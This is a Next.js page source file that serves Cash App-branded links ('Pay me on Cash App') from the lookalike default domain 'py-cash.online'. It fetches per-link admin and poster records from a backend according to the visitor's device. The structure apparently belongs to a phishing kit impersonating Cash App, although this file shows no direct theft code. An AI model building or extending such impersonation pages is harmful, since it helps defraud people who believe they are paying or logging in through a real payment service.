import Home from "@/app/components/Home";
import { site, API_URL } from "@/app/config/index";
import { headers } from "next/headers";

export async function generateMetadata({ params }) {
  const resolvedParams = await params;
  const { param, param2 } = resolvedParams || {};
  const headersList = headers();
  const host =
    headersList.get("x-forwarded-host") ||
    headersList.get("host") ||
    "py-cash.online";
  const proto = headersList.get("x-forwarded-proto") || "https";

  const baseUrl = `${proto}://${host}`;
  const title = param2 || "Cash App";
  const description =
    "Pay me on Cash App — Instantly exchange money for free on Cash App";
  const imageUrl = `/${param}/${param2}/opengraph-image`;

  return {
    metadataBase: new URL(baseUrl),
    title,
    description,
    openGraph: {
      title,
      description,
      type: "website",
      url: `/${param}/${param2}`,
      images: [
        {
          url: imageUrl,
          width: 1200,
          height: 630,
          alt: "Pay on Cash App",
        },
      ],
    },
    twitter: {
      card: "summary_large_image",
      title,
      description,
      images: [imageUrl],
    },
  };
}

export default async function page({ params }) {
  const { param, param2 } = params;
  
  const headersList = headers();
  const userAgent = headersList.get("user-agent") || "";

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

 
  const url = `${API_URL}/${site}/${param}/${param2}/${device}`;



  try {
    const res = await fetch(url);
    const data = await res.json();
    console.log("Two Params Page data:", data);

    if (data?.success === "exists") {
      return <Home adminId={data.adminId} posterId={data.posterId} param={param} param2={param2} linkConfig={data.link} />;
    }
  } catch (error) {
    console.error("Error fetching dynamic page data:", error);
  }

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-50">
      <div className="text-xl font-bold text-gray-400">No Page found!!</div>
    </div>
  );
}
